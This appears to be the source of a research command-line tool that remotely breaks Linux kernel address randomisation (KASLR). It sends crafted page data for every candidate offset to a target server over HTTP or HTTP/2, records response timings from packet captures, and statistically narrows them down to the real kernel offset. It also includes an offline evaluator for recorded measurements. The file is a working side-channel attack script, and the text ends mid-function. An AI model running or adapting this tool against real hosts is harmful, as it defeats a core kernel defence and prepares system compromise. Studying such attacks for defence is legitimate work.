import os
import binascii
import time
import click
import yaml
import signal
import sys
import random
import asyncio
import queue
import itertools
from datetime import datetime
import pandas as pd
import numpy as np
from addict import Dict
import numpy as np
from timeit import default_timer as timer

from utils import address_to_int, address_to_int_str, load_page_from_config, load_binary_page_from_config, prepare_pages, chunks
from config import load_config_file
from network import terminate_capture_thread
from network.http import CapturePySharkThreadHttp
from network.http2 import CapturePySharkThreadHttp2
from service import KASLRServiceRequests, KASLRServiceAIOHTTP, KASLRServiceHTTPX, KASLRServiceH2Time


# Defaults
KERNEL_TEXT_MAPPING = '0xffffffff80000000'
capture_thread = None


def signal_handler(sig, frame):
    global capture_thread
    # TODO: store_logs()

    # Terminate Capture Thread
    terminate_capture_thread(capture_thread)

    sys.exit(-1)


@click.group()
@click.option('--debug/--no-debug', default=False)
@click.option('-c', '--config', 'config_file', required=False, type=click.Path(exists=True))
@click.option('-b', '--backend', required=False, default='aiohttp', type=click.Choice(['requests', 'aiohttp', 'httpx', 'h2time']))
@click.option('-t', '--kernel-text-mapping', type=str, default=KERNEL_TEXT_MAPPING, callback=address_to_int)
@click.option('-m', '--http-version', 'http_version', required=False, default='http', type=click.Choice(['http', 'http2']))
@click.option('-t', '--monitor-traffic', 'monitor_traffic', required=False, type=bool, default=True)
@click.option('-h', '--host', type=str, default='0.0.0.0')
@click.option('-p', '--port', type=int, default=6666)
@click.option('-d', '--device', default="enp3s0")
@click.option('-f', '--page-file', 'page_files', type=click.Path(exists=True), multiple=True)
@click.option('-o', '--offset', 'offsets', type=str, multiple=True)
@click.pass_context
def cli(ctx, debug, config_file, backend, page_files, offsets, kernel_text_mapping, http_version, monitor_traffic, host, port, device):
    global capture_thread

    ctx.ensure_object(Dict)

    # Set debug level
    ctx.obj.debug = debug

    # Check arguments
    if len(offsets) != len(page_files):
        raise click.UsageError('Invalid number of page files and offsets')

    # Install signal handler to catch ctrl+c
    signal.signal(signal.SIGINT, signal_handler)

    # Load configuration file
    config = Dict()

    if config_file:
        config = load_config_file(config_file)

    # Overwrite from command line if not set
    if not config.http_version:
        config.http_version = http_version

    if not config.backend:
        config.backend = backend

    if not config.host:
        config.host = host

    if not config.port:
        config.port = port

    if not config.device:
        config.device = device

    if config.monitor_traffic:
        monitor_traffic = config.monitor_traffic

    if not config.kernel_text_mapping:
        config.kernel_text_mapping = kernel_text_mapping
    else:
        config.kernel_text_mapping = address_to_int_str(config.kernel_text_mapping)

    ctx.obj.config = config

    # Load pages from config file
    ctx.obj.pages = []
    if config.binary_pages:
        config_dir = os.path.dirname(config_file)

        for idx, config_page in enumerate(config.binary_pages):
            page_file = os.path.join(config_dir, config_page.file)
            page, page_offsets, kernel_offsets = load_binary_page_from_config(
               page_file,
               config_page.offsets,
               config.kernel_text_mapping
               )

            ctx.obj.pages.append(Dict({
                'page': page,
                'offsets': page_offsets,
                'kernel_offsets': kernel_offsets
            }))

    if config.pages:
        config_dir = os.path.dirname(config_file)

        for idx, config_page in enumerate(config.pages):
            page_file = os.path.join(config_dir, config_page.file)
            page, page_offsets, kernel_offsets = load_page_from_config(
               page_file,
               config.kernel_text_mapping
               )

            ctx.obj.pages.append(Dict({
                'page': page,
                'offsets': page_offsets,
                'kernel_offsets': kernel_offsets
            }))

    # Load pages from parameters
    for idx, page_file in enumerate(page_files):
        if offsets[idx] == "-1":
            page_offsets = [x for x in range(0, 4096, 8)]
        else:
            page_offsets = [int(x) for x in offsets[idx].split(",")]

        page, page_offsets, kernel_offsets = load_binary_page_from_config(
            page_file,
            page_offsets,
            config.kernel_text_mapping
            )

        ctx.obj.pages.append(Dict({
            'page': page,
            'offsets': page_offsets,
            'kernel_offsets': kernel_offsets
        }))

    # Preparing all page buffers
    kaslr_page_buffers = [0] * 512
    kernel_text_mapping_base = address_to_int_str(KERNEL_TEXT_MAPPING)
    for kaslr_offset in range(0, 512):
        kaslr_page_buffers[kaslr_offset] = \
            prepare_pages(ctx.obj.pages, kernel_text_mapping_base, kaslr_offset)

    # Setup service
    if backend == 'requests':
        ctx.obj.service = KASLRServiceRequests(config.host, config.port, config.http_version, kaslr_page_buffers)
    elif backend == 'aiohttp':
        ctx.obj.service = KASLRServiceAIOHTTP(config.host, config.port, config.http_version, kaslr_page_buffers)
    elif backend == 'h2time':
        ctx.obj.service = KASLRServiceH2Time(config.host, config.port, config.http_version, kaslr_page_buffers)
    elif backend == 'httpx':
        ctx.obj.service = KASLRServiceHTTPX(config.host, config.port, config.http_version, kaslr_page_buffers)

    if config.http_version == 'http2' and not ctx.obj.service.supports_http2():
        raise click.UsageError(f'Backend {backend} does not support HTTP/2.')

    # Start capturing thread
    if config.monitor_traffic:
        if config.http_version == 'http':
            capture_thread = CapturePySharkThreadHttp(interface=config.device, tcp_port=config.port, backend=backend)
        elif config.http_version == 'http2':
            capture_thread = CapturePySharkThreadHttp2(interface=config.device, tcp_port=config.port, backend=backend)
        else:
            raise click.UsageError('Invalid http mode given.')

        capture_thread.start()

        ctx.obj.capture_thread = capture_thread


def filter_outlier(df, column):
    groups = df.groupby('Offset')[column]
    groups_mean = groups.transform('mean')
    groups_std = groups.transform('std')
    m = df[column].between(groups_mean.sub(groups_std.mul(2)),
                           groups_mean.add(groups_std.mul(2)),
                           inclusive='both')

    return df.loc[m]


def print_update(measurements, server_measurements):
    try:
        df = pd.DataFrame(measurements)
        df = filter_outlier(df, 'TS Prev Frame')
        #df = df.mask(df.sub(df.mean()).div(df.std()).abs().gt(2))

        df_median = df.groupby('Offset').median().sort_values(by=['TS Prev Frame'], ascending=False)
        click.echo(df_median.head(n=20))

        #df_mean = df.groupby('Offset').mean().sort_values(by=['TS Prev Frame'], ascending=False)
        #click.echo(df_mean.head(n=20))

        df = pd.DataFrame(server_measurements)
        df_mean = df.groupby('Offset').mean()
        df_mean = df_mean.sort_values(by=['Server1'], ascending=False)
        click.echo(df_mean.head(n=20))
    except Exception as e:
        pass


@click.command()
@click.option('-b', '--kernel-offset-begin', type=int, default=0)
@click.option('-e', '--kernel-offset-end', type=int, default=511)
@click.option('-n', '--tries', type=int, default=10)
@click.option('-d', '--delay', type=int, default=2)
@click.pass_context
def attack_range(ctx, kernel_offset_begin, kernel_offset_end, tries, delay):
    """Perform KASLR break on a range of offsets"""
    service = ctx.obj.service
    capture_thread = ctx.obj.capture_thread

    # Randomize offsets
    kaslr_offsets = [x for x in range(kernel_offset_begin, kernel_offset_end + 1)]
    random.shuffle(kaslr_offsets)

    # Set all offsets
    service.set_offsets(kaslr_offsets)

    # Store measurements
    measurements = []
    server_measurements = []

    start_time = datetime.now()

    # Run
    for t in range(tries):
        click.echo(f"Round {t}")

        # Reshuffle offsets
        random.shuffle(kaslr_offsets)

        # Measure
        kaslr_offset_pairs = list(chunks(kaslr_offsets, 2))
        for pair in kaslr_offset_pairs:
            results = service.try_offsets(pair)
            for idx, kaslr_offset in enumerate(pair):
                server_measurements.append({
                    'Offset': kaslr_offset,
                    'Server1': results[idx][0],
                    'Server2': results[idx][1]
                })

        #results = service.try_offsets(kaslr_offsets)
        #for idx, kaslr_offset in enumerate(kaslr_offsets):
        #    server_measurements.append({
        #        'Offset': kaslr_offset,
        #        'Server1': results[idx][0],
        #        'Server2': results[idx][1]
        #    })

        # Consume parsed packets
        try:
            while True:
                m = capture_thread.measurements.get(False)
                measurements.append(m)
        except queue.Empty:
            pass

        # Print Update
        print_update(measurements, server_measurements)

        # Wait
        time.sleep(delay)

    df = pd.DataFrame(measurements)
    df = filter_outlier(df, 'TS Prev Frame')
    df_median = df.groupby('Offset').median().sort_values(by=['TS Prev Frame'], ascending=False)

    click.echo("Winning offset:")
    winner = df_median.head(1)
    winning_offset = int(winner.index.tolist()[0])
    click.echo(f"[{winning_offset}]")

    now = datetime.now()
    click.echo(start_time)
    click.echo(now)
    click.echo(now - start_time)

    df = pd.DataFrame(measurements)
    df.to_csv('full.csv')
    df_median.to_csv('log.csv')

    # Terminate Capture Thread
    terminate_capture_thread(capture_thread)


@click.command()
@click.option('-b', '--kernel-offset-begin', type=int, default=0)
@click.option('-e', '--kernel-offset-end', type=int, default=511)
@click.option('-n', '--tries', type=int, default=1000)
@click.option('-d', '--delay', type=int, default=2)
@click.pass_context
def attack_chunks(ctx, kernel_offset_begin, kernel_offset_end, tries, delay):
    """Perform KASLR break on chunks"""
    service = ctx.obj.service
    capture_thread = ctx.obj.capture_thread

    # Randomize offsets
    kaslr_offsets = [x for x in range(kernel_offset_begin, kernel_offset_end + 1)]
    random.shuffle(kaslr_offsets)

    # Set all offsets
    service.set_offsets(kaslr_offsets)

    # Store measurements
    measurements = []
    server_measurements = []

    # Run
    for t in range(tries):
        click.echo(f"Round {t}")

        # Reshuffle offsets
        random.shuffle(kaslr_offsets)

        # Create smaller offset packets
        kaslr_offset_packets = chunks(kaslr_offsets, 16)

        # Measure
        for kaslr_offset_packet in kaslr_offset_packets:
            click.echo(kaslr_offset_packet)
            # Randomize offsets
            kaslr_offsets_in_packet = [x for x in kaslr_offset_packet]
            random.shuffle(kaslr_offsets_in_packet)

            results = service.try_offsets(kaslr_offsets_in_packet)
            for idx, kaslr_offset in enumerate(kaslr_offsets_in_packet):
                server_measurements.append({
                    'Offset': kaslr_offset,
                    'Server1': results[idx][0],
                    'Server2': results[idx][1]
                })

        # Consume parsed packets
        try:
            while True:
                m = capture_thread.measurements.get(False)
                measurements.append(m)
        except queue.Empty:
            pass

        # Print Update
        print_update(measurements, server_measurements)

        # Wait
        time.sleep(delay)

    # Terminate Capture Thread
    terminate_capture_thread(capture_thread)


@click.command()
@click.option('-b', '--kernel-offset-begin', type=int, default=0)
@click.option('-e', '--kernel-offset-end', type=int, default=511)
@click.option('-n', '--tries', type=int, default=10)
@click.option('-d', '--delay', type=int, default=2)
@click.pass_context
def attack_league(ctx, kernel_offset_begin, kernel_offset_end, tries, delay):
    """Perform KASLR break league based on counts"""
    service = ctx.obj.service
    capture_thread = ctx.obj.capture_thread

    # Randomize offsets
    kaslr_offsets = [x for x in range(kernel_offset_begin, kernel_offset_end + 1)]
    random.shuffle(kaslr_offsets)

    # Set all offsets
    service.set_offsets(kaslr_offsets)

    # Store measurements
    total_measurements = []
    server_measurements = []

    # Reshuffle offsets
    random.shuffle(kaslr_offsets)

    kaslr_offset_pairs = list(chunks(kaslr_offsets, 2))

    start_time = datetime.now()

    # Run
    t = 0
    running = True
    while running is True:
        click.echo(f"Round {t}")
        t += 1

        run_again = True
        measurements = []
        same_winner = 0
        last_winner = None

        subround = 0
        while run_again is True:
            click.echo(f"Subround {subround}")
            run_again = False

            if (len(kaslr_offset_pairs) == 0):
                running = False
                break

            # Measure pairs
            sent_packets = 0
            for pair in kaslr_offset_pairs:
                results = service.try_offsets(pair)
                for idx, kaslr_offset in enumerate(pair):
                    sent_packets += 1
                    server_measurements.append({
                        'Offset': kaslr_offset,
                        'Server1': results[idx][0],
                        'Server2': results[idx][1]
                    })

            # Get parsed packets
            received_packets = 0
            #while received_packets < sent_packets:
            try:
                first_round = True
                while True:
                    m = capture_thread.measurements.get(False)
                    if m['Offset'] == 513:
                        continue
                    measurements.append(m)
                    total_measurements.append(m)
                    received_packets += 1
            except queue.Empty:
                if first_round is False:
                    service.try_offset(513)
                    first_round = False
                pass

            if len(measurements) == 0:
                run_again = True
                continue

            # Get winner
            winner = []
            winner_without = []
            loser = []
            threshold_counter = 0

            #if received_packets == 0: # weird lab06
                #run_again = True
                #continue

            df = pd.DataFrame(measurements) # FIXME: make total_measurements
            df2 = pd.DataFrame(total_measurements) # FIXME: make total_measurements
            std_mean = df['TS Prev Frame'].std()

            for pair in kaslr_offset_pairs:
                offset1, offset2 = pair
                values1 = list(df[df['Offset'] == offset1]['TS Prev Frame'])
                values2 = list(df[df['Offset'] == offset2]['TS Prev Frame'])
                values1a = list(df2[df2['Offset'] == offset1]['TS Prev Frame'])
                values2a = list(df2[df2['Offset'] == offset2]['TS Prev Frame'])
                number_of_values = len(values1)
                total = 2 * number_of_values

                mean1 = pd.Series(values1).mean()
                mean2 = pd.Series(values2).mean()

                n2 = len(values2)
                if n2 < number_of_values:
                    number_of_values = n2

                count1 = sum([1 if values1[x] > values2[x] else 0 for x in range(number_of_values)])
                count2 = number_of_values - count1

                if total == 0:
                    run_again = True
                    continue

                diff = abs(count1-count2)/total

                # click.echo(f"{pair}: {diff}")
                winning_offset = offset1
                losing_offset = offset2
                winning_mean = mean1
                if mean1 < mean2:
                    winning_offset = offset2
                    winning_mean = mean2
                    losing_offset = offset1

                if subround < tries:
                    run_again = True

                #if diff >= 0.20 and winning_mean > (std_mean * 1.2):  # diff not big enough
                if diff >= 0.20:  # diff not big enough
                    threshold_counter += 1

                    if count1 > count2 and mean1 > std_mean:
                        winner.append(offset1)
                        loser.append(offset2)
                    elif mean2 > std_mean:
                        winner.append(offset2)
                        loser.append(offset1)
                else:
                    if total <= 80: # Only run again until a max
                        run_again = True

                    if count1 > count2 and mean1 > std_mean:
                        winner_without.append(offset1)
                    elif mean2 > std_mean:
                        winner_without.append(offset2)

            if threshold_counter == 1 and total > 10: # early abort if there is only one candidate
                run_again = False
            elif threshold_counter <= 10 and subround > 25: # early abort if there is only one candidate
                run_again = False
            elif threshold_counter <= (len(kaslr_offsets)/2) and subround >= tries:
                run_again = False
            elif len(winner) == 0 and total < 50:
                run_again = True

            # Check if we have the samme winner all the time and early abort
            if len(winner) > 0:
                if last_winner and np.array_equal(sorted(winner), sorted(last_winner)):
                    same_winner += 1
                elif last_winner:
                    same_winner = 0
                    last_winner = winner
                else:
                    last_winner = winner
            else:
                last_winner = None
                same_winner = 0

            if len(winner) == 1 and same_winner >= 3:
                run_again = False
            elif len(winner) < 5 and same_winner >= 3 and t > 1:
                run_again = False
            elif t > 1 and subround < 20:
                run_again = True

            # Print Update
            print_update(total_measurements, server_measurements)

            sorted_winner = sorted(winner)
            click.echo(f"Current: {sorted_winner}")

            if subround > 30 and len(winner) == 0:
                if len(winner_without) == 0:
                    # restart?
                    run_again = False
                    winner = [x for x in range(kernel_offset_begin, kernel_offset_end + 1)]
                    random.shuffle(winner)
                else:
                    winer = winner_without

            # Wait
            time.sleep(delay)

            random.shuffle(kaslr_offsets)
            subround += 1

        print_update(total_measurements, server_measurements)

        if len(winner) == 1:
            click.echo("Winning offset:")
            click.echo(winner)
            running = False

            now = datetime.now()
            click.echo(start_time)
            click.echo(now)
            click.echo(now - start_time)
            terminate_capture_thread(capture_thread)
            sys.exit(0)
        else:
            # Check if winner has enough members for pairs
            if len(winner) == 0:
                winner = [x for x in range(kernel_offset_begin, kernel_offset_end + 1)]
                random.shuffle(winner)
            elif len(winner) % 2 != 0:
                winner.append(loser[0])

            # Create new pairs out of winner
            kaslr_offsets = [x for x in winner]
            random.shuffle(kaslr_offsets)
            kaslr_offset_pairs = list(chunks(kaslr_offsets, 2))
            click.echo("New pairs")
            click.echo(kaslr_offset_pairs)

        # # Print Update
        # print_update(measurements, server_measurements)
        #
        # # Wait
        # time.sleep(delay)

    # Terminate Capture Thread
    terminate_capture_thread(capture_thread)


@click.command()
@click.option('-b', '--kernel-offset-begin', type=int, default=0)
@click.option('-e', '--kernel-offset-end', type=int, default=511)
@click.option('-n', '--tries', type=int, default=10)
@click.option('-d', '--delay', type=int, default=2)
@click.pass_context
def attack_league2(ctx, kernel_offset_begin, kernel_offset_end, tries, delay):
    """Perform KASLR break league based on mean"""
    service = ctx.obj.service
    capture_thread = ctx.obj.capture_thread

    # Randomize offsets
    kaslr_offsets = [x for x in range(kernel_offset_begin, kernel_offset_end + 1)]
    random.shuffle(kaslr_offsets)

    # Set all offsets
    service.set_offsets(kaslr_offsets)

    # Store measurements
    total_measurements = []
    server_measurements = []

    # Reshuffle offsets
    random.shuffle(kaslr_offsets)

    kaslr_offset_pairs = list(chunks(kaslr_offsets, 2))

    start_time = datetime.now()

    # Run
    t = 0
    running = True
    while running is True:
        t += 1
        click.echo(f"Round {t}")

        run_again = True
        measurements = []

        subround = 0
        while run_again is True:
            click.echo(f"Subround {subround}")
            run_again = False

            # Measure pairs
            sent_packets = 0
            for pair in kaslr_offset_pairs:
                results = service.try_offsets(pair)
                for idx, kaslr_offset in enumerate(pair):
                    sent_packets += 1
                    server_measurements.append({
                        'Offset': kaslr_offset,
                        'Server1': results[idx][0],
                        'Server2': results[idx][1]
                    })

            # Get parsed packets
            received_packets = 0
            #while received_packets < sent_packets:
            try:
                while True:
                    m = capture_thread.measurements.get(False)
                    measurements.append(m)
                    total_measurements.append(m)
                    received_packets += 1
            except queue.Empty:
                pass

            # Get winner
            winner = []
            winner_without = []
            loser = []
            threshold_counter = 0
            df = pd.DataFrame(measurements)
            df = filter_outlier(df, 'TS Prev Frame')

            std_mean = df['TS Prev Frame'].std()

            for pair in kaslr_offset_pairs:
                offset1, offset2 = pair
                values1 = df[df['Offset'] == offset1]['TS Prev Frame']
                values2 = df[df['Offset'] == offset2]['TS Prev Frame']

                mean1 = values1.mean()
                mean2 = values2.mean()

                number_of_values = len(list(values1))
                total = number_of_values * 2

                if subround < tries:
                    run_again = True

                winning_offset = offset1
                losing_offset = offset2
                winning_mean = mean1

                if mean1 < mean2:
                    winning_offset = offset2
                    winning_mean = mean2
                    losing_offset = offset1

                if winning_mean > (std_mean * 1.2):
                    winner.append(winning_offset)
                else:
                    loser.append(winning_offset)

                loser.append(losing_offset)

            # Print Update
            print_update(total_measurements, server_measurements)

            sorted_winner = sorted(winner)
            click.echo(f"Current: {sorted_winner}")

            # Wait
            time.sleep(delay)

            random.shuffle(kaslr_offsets)
            subround += 1

        print_update(total_measurements, server_measurements)

        if len(winner) == 1:
            click.echo("Winning offset:")
            click.echo(winner)
            running = False

            now = datetime.now()
            click.echo(start_time)
            click.echo(now)
            click.echo(now - start_time)
            sys.exit(0)
        else:
            # Check if winner has enough members for pairs
            if len(winner) % 2 != 0:
                winner.append(loser[0])

            # Create new pairs out of winner
            kaslr_offsets = [x for x in winner]
            random.shuffle(kaslr_offsets)
            kaslr_offset_pairs = list(chunks(kaslr_offsets, 2))
            click.echo("New pairs")
            click.echo(kaslr_offset_pairs)

        # # Print Update
        # print_update(measurements, server_measurements)
        #
        # # Wait
        # time.sleep(delay)

    # Terminate Capture Thread
    terminate_capture_thread(capture_thread)


@click.command()
@click.option('-b', '--kernel-offset-begin', type=int, default=0)
@click.option('-e', '--kernel-offset-end', type=int, default=511)
@click.option('-n', '--tries', type=int, default=10)
@click.option('-d', '--delay', type=int, default=2)
@click.pass_context
def attack_league_http2(ctx, kernel_offset_begin, kernel_offset_end, tries, delay):
    """Perform KASLR break league based on counts"""
    service = ctx.obj.service
    capture_thread = ctx.obj.capture_thread

    # Randomize offsets
    kaslr_offsets = [x for x in range(kernel_offset_begin, kernel_offset_end + 1)]
    random.shuffle(kaslr_offsets)

    # Set all offsets
    service.set_offsets(kaslr_offsets)

    # Store measurements
    total_measurements = []
    server_measurements = []

    # Reshuffle offsets
    random.shuffle(kaslr_offsets)

    kaslr_offset_pairs = list(chunks(kaslr_offsets, 2))

    start_time = datetime.now()

    # Run
    t = 0
    running = True
    while running is True:
        click.echo(f"Round {t}")

        run_again = True
        measurements = [None] * len(kaslr_offset_pairs)

        subround = 0
        while run_again is True:
            click.echo(f"Subround {subround}")
            run_again = False

            # Measure pairs
            for idx, pair in enumerate(kaslr_offset_pairs):
                random.shuffle(pair)
                winning_offset = service.try_pair(pair)
                if measurements[idx] is None:
                    measurements[idx] = []
                measurements[idx].append(winning_offset)

            # Get winner
            winner = []
            winner_without = []
            loser = []
            threshold_counter = 0

            if (len(kaslr_offset_pairs) <= 4):
                click.echo(measurements)

            for idx, pair in enumerate(kaslr_offset_pairs):
                offset1, offset2 = pair
                number_of_values = len(measurements[idx])

                count1 = sum([1 if x == offset1 else 0 for x in measurements[idx]])
                count2 = number_of_values - count1
                total = 2 * number_of_values

                if total == 0:
                    run_again = True
                    continue

                diff = abs(count1-count2)/total

                if subround < tries:
                    run_again = True

                if diff >= 0.20:  # diff not big enough
                    threshold_counter += 1

                    if count1 > count2:
                        winner.append(offset1)
                        winner_without.append(offset1)
                        loser.append(offset2)
                    else:
                        winner.append(offset2)
                        winner_without.append(offset2)
                        loser.append(offset1)
                else:
                    if total <= 10: # Only run again until a max
                        run_again = True

            if threshold_counter == 1 and total > 30: # early abort if there is only one candidate
                run_again = False
            elif threshold_counter <= 10 and total > 50: # early abort if there is only one candidate
                run_again = False

            if len(winner) == 0 and total < 200:
                run_again = True
            else:
                winner = winner_without

            # Print Update
            print_update(total_measurements, server_measurements)

            sorted_winner = sorted(winner)
            click.echo(f"Current: {sorted_winner}")

            # Wait
            time.sleep(delay)

            random.shuffle(kaslr_offsets)
            subround += 1

        print_update(total_measurements, server_measurements)

        if len(winner) == 1:
            click.echo("Winning offset:")
            click.echo(winner)
            running = False

            now = datetime.now()
            click.echo(start_time)
            click.echo(now)
            click.echo(now - start_time)
            sys.exit(0)
        else:
            # Check if winner has enough members for pairs
            if len(winner) % 2 != 0:
                winner.append(loser[0])

            # Create new pairs out of winner
            kaslr_offsets = [x for x in winner]
            random.shuffle(kaslr_offsets)
            kaslr_offset_pairs = list(chunks(kaslr_offsets, 2))
            click.echo("New pairs")
            click.echo(kaslr_offset_pairs)

    # Terminate Capture Thread
    terminate_capture_thread(capture_thread)


@click.command()
@click.option('-b', '--kernel-offset-begin', type=int, default=0)
@click.option('-e', '--kernel-offset-end', type=int, default=511)
@click.option('-n', '--tries', type=int, default=10)
@click.option('-d', '--delay', type=int, default=3)
@click.pass_context
def attack_range_http2(ctx, kernel_offset_begin, kernel_offset_end, tries, delay):
    """Perform KASLR break on a range of offsets"""
    service = ctx.obj.service
    capture_thread = ctx.obj.capture_thread

    # Randomize offsets
    kaslr_offsets = [x for x in range(kernel_offset_begin, kernel_offset_end + 1)]
    random.shuffle(kaslr_offsets)

    # Set all offsets
    service.set_offsets(kaslr_offsets)

    start_time = datetime.now()

    # Run
    t = 0
    running = True
    measurements = {}
    total_tries = 0

    while running is True:
        t += 1
        click.echo(f"Round {t}")

        run_again = True
        round_measurements = {}

        subround = 1
        while run_again is True:
            click.echo(f"Subround {subround}")
            run_again = False
            total_tries += 1

            if t == 1:
                tries = 20
                delta = 0.7
            else:
                tries = 10
                delta = 0.8

            # Reshuffle offsets
            if subround % 2 == 0:
                random.shuffle(kaslr_offsets)
            kaslr_offset_pairs = list(chunks(kaslr_offsets, 2))
            if subround % 2 != 0:
                kaslr_offset_pairs = [(y,x) for x,y in kaslr_offset_pairs]

            # Measure
            for idx, pair in enumerate(kaslr_offset_pairs):
                winning_offset = service.try_pair(pair)
                if winning_offset not in measurements:
                    measurements[winning_offset] = 0
                measurements[winning_offset] += 1
                if winning_offset not in round_measurements:
                    round_measurements[winning_offset] = 0
                round_measurements[winning_offset] += 1

            if subround < tries:
                print('not enough')
                run_again = True

            # Print update
            df = pd.DataFrame(measurements.values(), index=measurements.keys(), columns=['Count'])
            df = df.sort_values(['Count'], ascending=False)
            df['Value'] = df['Count'] / total_tries
            click.echo(df.head(n=20))
            df = pd.DataFrame(round_measurements.values(), index=round_measurements.keys(), columns=['Count'])
            df = df.sort_values(['Count'], ascending=False)
            df['Value'] = df['Count'] / subround
            click.echo(df.head(n=10))

            # Strip
            winner = []
            loser = []
            for offset, count in measurements.items():
                diff = count / total_tries
                if diff > delta:
                    winner.append(offset)
                else:
                    loser.append(offset)

            if len(winner) == 0 and subround >= (tries / 2): # check round measurements
                for offset, count in round_measurements.items():
                    diff = count / subround
                    if diff > delta:
                        winner.append(offset)

            split_half = False
            if len(winner) == 0:
                if subround < 30:
                    print('no winner, not enough')
                    run_again = True
                else:
                    split_half = True
            elif subround >= 30:
                split_half = True

            if split_half: # top-n are new winners
                click.echo('Rest half winner')
                df = pd.DataFrame(measurements.values(), index=measurements.keys(), columns=['Count'])
                df = df.sort_values(['Count'], ascending=False)

                df_n = int(len(df) / 2)
                winner = list(df.index[:df_n])

                # we need to reset everything
                measurements = {}
                total_tries = 0

            sorted_winner = sorted(winner)
            click.echo(f"Current: {sorted_winner}")

            # Wait
            time.sleep(delay)
            subround += 1

        if len(winner) == 1:
            click.echo("Winning offset:")
            click.echo(winner)
            running = False

            now = datetime.now()
            click.echo(start_time)
            click.echo(now)
            click.echo(now - start_time)
            sys.exit(0)
        else:
            # Check if winner has enough members for pairs
            if len(winner) % 2 != 0:
                winner.append(loser[0])

            kaslr_offsets = [x for x in winner]
            random.shuffle(kaslr_offsets)
            round_measurements = {}


    now = datetime.now()
    click.echo(start_time)
    click.echo(now)
    click.echo(now - start_time)

    # Terminate Capture Thread
    terminate_capture_thread(capture_thread)


@click.command()
@click.option('-b', '--kernel-offset-begin', type=int, default=0)
@click.option('-e', '--kernel-offset-end', type=int, default=511)
@click.option('-n', '--tries', type=int, default=10)
@click.option('-d', '--delay', type=int, default=2)
@click.pass_context
def attack_range3(ctx, kernel_offset_begin, kernel_offset_end, tries, delay):
    """Perform KASLR break on a range of offsets"""
    service = ctx.obj.service
    capture_thread = ctx.obj.capture_thread

    # Randomize offsets
    kaslr_offsets = [x for x in range(kernel_offset_begin, kernel_offset_end + 1)]
    random.shuffle(kaslr_offsets)

    # Set all offsets
    service.set_offsets(kaslr_offsets)

    # Store measurements
    measurements = {}

    start_time = datetime.now()

    # Run
    for t in range(tries):
        click.echo(f"Round {t}")

        # Reshuffle offsets
        random.shuffle(kaslr_offsets)
        kaslr_offset_pairs = list(chunks(kaslr_offsets, 2))

        # Measure
        for pair in kaslr_offset_pairs:
            winner = service.try_pair(pair)
            if winner not in measurements:
                measurements[winner] = 0
            measurements[winner] += 1

        if t > 6:
            first = len(kaslr_offsets)
            kaslr_offsets = []
            loser = []
            for offset, count in measurements.items():
                delta = count / t
                if delta >= 0.7:
                    kaslr_offsets.append(offset)
                else:
                    loser.append(offset)

            if len(kaslr_offsets) % 2 != 0:
                kaslr_offsets.append(loser[0])

        # Print Update
        df = pd.DataFrame(measurements.values(), index=measurements.keys(), columns=['Count'])
        df = df.sort_values(['Count'], ascending=False)
        df['Value'] = df['Count'] / t
        click.echo(df.head(n=20))

        # Wait
        time.sleep(delay)

    df = pd.DataFrame(measurements.values(), index=measurements.keys(), columns=['Count'])
    df = df.sort_values(['Count'], ascending=False)
    df['Value'] = df['Count'] / tries
    click.echo("Winning offset:")
    winner = df.head(1)
    winning_offset = int(winner.index.tolist()[0])
    click.echo(f"[{winning_offset}]")

    now = datetime.now()
    click.echo(start_time)
    click.echo(now)
    click.echo(now - start_time)

    # Terminate Capture Thread
    terminate_capture_thread(capture_thread)


@click.command()
@click.option('-f', '--file', 'raw_file', required=True, type=click.Path(exists=True))
@click.option('-b', '--kernel-offset-begin', type=int, default=0)
@click.option('-e', '--kernel-offset-end', type=int, default=511)
@click.option('-n', '--tries', type=int, default=10)
@click.option('-r', '--repititions', type=int, default=10)
@click.option('-g', '--ground-truth', type=int, default=14)
def evaluate_raw(raw_file, kernel_offset_begin, kernel_offset_end, tries, repititions, ground_truth):
    """Evaluate strategy based on raw file"""

    correct = 0
    for r in range(repititions):
        winner = simulate_evaluation(raw_file, kernel_offset_begin, kernel_offset_end, tries, True)
        if winner == ground_truth:
            correct += 1
        click.echo(f"Winning offset: {winner}")

    success_rate = correct/repititions * 100.
    click.echo(f"Success Rate: {success_rate:.2f}")


def filter_percentile(x, p=.15):
    # return x[x.between(x.quantile(p), x.quantile(1-p))]
    return x[x.between(x.quantile(0.1), x.quantile(0.9))]


def simulate_evaluation(raw_file, kernel_offset_begin, kernel_offset_end, tries, verbose=False):
    # Extract measurements from csv file
    measurements = {}
    all_values = []
    df = pd.read_csv(raw_file)
    groups = df.groupby('Offset')
    for offset, group in groups:
        measurements[offset] = group['TS Prev Frame'].reset_index(drop=True)
        # shuffle data
        # measurements[offset] = measurements[offset].sample(frac=1).reset_index(drop=True)

    # Randomize offsets
    kaslr_offsets = [x for x in range(kernel_offset_begin, kernel_offset_end + 1)]
    random.shuffle(kaslr_offsets)
    kaslr_offset_pairs = list(chunks(kaslr_offsets, 2))

    running = True
    t = 0
    total = 0

    while running is True:
        if verbose:
            click.echo(f"Round {t}")
        run_again = True

        last_winner = None
        same_winner = 0
        subround = 0

        while run_again is True:
            if verbose:
                click.echo(f"Subround {subround}")
            run_again = False

            # Fake Measure
            total += 1
            if (total > len(measurements[0])):
                if verbose:
                    click.echo(f"Missing measurement data")
                return None

            # Calculate current mean
            for offset, m in measurements.items():
                all_values.append(m[total-1])

            current_mean = pd.Series(all_values).mean()

            winner = []
            threshold_counter = 0
            loser = []

            for pair in kaslr_offset_pairs:
                offset1, offset2 = pair

                total_values1 = filter_percentile(measurements[offset1][0:total])
                total_values2 = filter_percentile(measurements[offset2][0:total])
                # total_values1 = filter_percentile(measurements[offset1][total-subround-1:total])
                # total_values2 = filter_percentile(measurements[offset2][total-subround-1:total])

                # if len(total_values1) == 0 and len(total_values2) == 0 and subround > 5:
                #     if verbose:
                #         click.echo('no values')
                #     return None

                mean1 = total_values1.mean()
                mean2 = total_values2.mean()

                if (mean1 > mean2) and mean1 > current_mean:
                    threshold_counter += 1
                    winner.append(offset1)
                    loser.append(offset2)
                elif mean2 > current_mean:
                    threshold_counter += 1
                    winner.append(offset2)
                    loser.append(offset1)

                if subround < tries or len(winner) == 0:
                    run_again = True

                if threshold_counter < 50 and threshold_counter > 20 and subround > 5:
                    run_again = False
                if threshold_counter > 0 and threshold_counter < 20 and subround > 15:
                    run_again = False

            # Check if we have the samme winner all the time and early abort
            if len(winner) > 0:
                if last_winner and np.array_equal(sorted(winner), sorted(last_winner)):
                    same_winner += 1
                elif last_winner:
                    same_winner = 0
                    last_winner = winner
                else:
                    last_winner = winner
            else:
                last_winner = None
                same_winner = 0

            if same_winner >= 4:
